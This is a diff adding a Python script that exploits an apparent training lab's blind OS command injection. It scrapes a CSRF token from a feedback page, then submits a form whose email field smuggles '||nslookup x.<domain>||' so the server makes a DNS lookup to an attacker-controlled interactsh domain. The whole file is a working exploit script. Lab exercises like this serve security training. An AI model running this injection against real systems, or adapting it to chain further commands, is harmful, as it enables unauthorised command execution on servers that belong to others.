@@ -1,0 +1,42 @@
+import requests
+import re
+
+session = requests.session()
+base_url = input("Enter the lab base URL: ").strip().rstrip("/")
+oast_domain = input("Enter your interactsh domain: ").strip()
+
+feedback_url = f"{base_url}/feedback"
+target_url = f"{base_url}/feedback/submit"
+
+initial_page = session.get(feedback_url)
+
+print("Finding CSRF token...")
+csrf_match = re.search(r'name="csrf" value="([^"]+)"', initial_page.text)
+
+if csrf_match:
+    csrf_token = csrf_match.group(1)
+    print(f"[*] Found CSRF token: {csrf_token}")
+else:
+    print("[*] Error: Could not find CSRF token on the page.")
+    exit(1)
+
+payload = {
+    'csrf': csrf_token,
+    'name': "haha",
+    'email': f"x||nslookup x.{oast_domain}||",
+    'subject': "subject_0001",
+    'message': "OOB test"
+}
+
+try:
+    response = session.post(target_url, data=payload, timeout=10)
+except requests.RequestException as e:
+    print(f"[*] Payload execution failed: {e}")
+    exit(1)
+
+if response.status_code == 200:
+    print("[*] Payload sent successfully.")
+    print("[*] Check your interactsh terminal for a DNS lookup to x." + oast_domain)
+else:
+    print(f"[*] Exploit failed with status {response.status_code}")
+    print(response.text[:500])
